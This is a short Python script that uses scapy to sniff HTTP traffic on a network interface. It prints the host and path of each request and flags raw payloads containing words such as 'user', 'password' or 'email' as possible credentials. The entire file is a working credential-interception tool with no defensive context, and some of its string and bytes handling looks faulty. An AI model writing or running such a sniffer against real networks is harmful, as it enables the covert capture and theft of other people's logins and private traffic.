#! /usr/bin/env python

import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to use")
    options = parser.parse_args()
    if not options.interface:
        options.interface = input("Enter interface: ")
    return options.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw]
            keys = ["user", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >>" + load)
                    break
            print(packet.show())
iface = get_interface()
sniff(iface)